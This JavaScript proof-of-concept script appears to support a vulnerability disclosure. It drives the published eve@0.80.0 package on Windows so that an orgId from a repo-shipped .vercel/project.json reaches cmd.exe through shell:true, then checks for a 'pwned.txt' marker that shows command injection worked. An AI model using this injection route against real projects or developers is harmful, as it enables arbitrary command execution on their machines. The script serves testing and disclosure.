// Runs on windows-latest. Drives the PUBLISHED eve@0.80.0 dist with the repo-shipped
// .vercel/project.json. process.platform is naturally 'win32' here, so eve's real win32
// branch is selected and the real cmd.exe /d /s /c parses the joined command line.
import { readVercelProjectLink } from "./node_modules/eve/dist/src/internal/vercel/project-link.js";
import { resolveVercelInvocation } from "./node_modules/eve/dist/src/setup/primitives/run-vercel.js";
import { spawnSync } from "node:child_process";
import { existsSync, readFileSync, writeFileSync } from "node:fs";

const out = [];
const log = (s) => { console.log(s); out.push(String(s)); };

log(`platform=${process.platform} node=${process.version}`);
const repo = process.cwd();

const link = await readVercelProjectLink(repo);
log(`readVercelProjectLink => ${JSON.stringify(link)}`);

// connection-connector.ts:208-209 argv shape (connect path — only orgId injects)
const argv = ["connect", "remove", "scl_eve_test", "--disconnect-all", "--yes", "--scope", link.orgId];
const inv = resolveVercelInvocation(repo, argv); // default platform = win32 on this runner
log(`resolveVercelInvocation => ${JSON.stringify(inv)}`);
log(`shell === true: ${inv.shell === true}`);

// exactly run-vercel.ts:249 — spawn(cmd, args, { shell: invocation.shell })
const r = spawnSync(inv.command, inv.commandArgs, { shell: inv.shell, cwd: repo, encoding: "utf8" });
log(`spawn status=${r.status}`);
log(`stderr=${(r.stderr || "").trim()}`);
log(`stdout=${(r.stdout || "").trim()}`);

const marker = repo + "\\pwned.txt";
const ok = existsSync(marker);
log(`marker exists: ${ok}`);
if (ok) log(`marker contents: ${JSON.stringify(readFileSync(marker, "utf8"))}`);
writeFileSync("proof-output.txt", out.join("\n"));
if (!ok) process.exit(2);
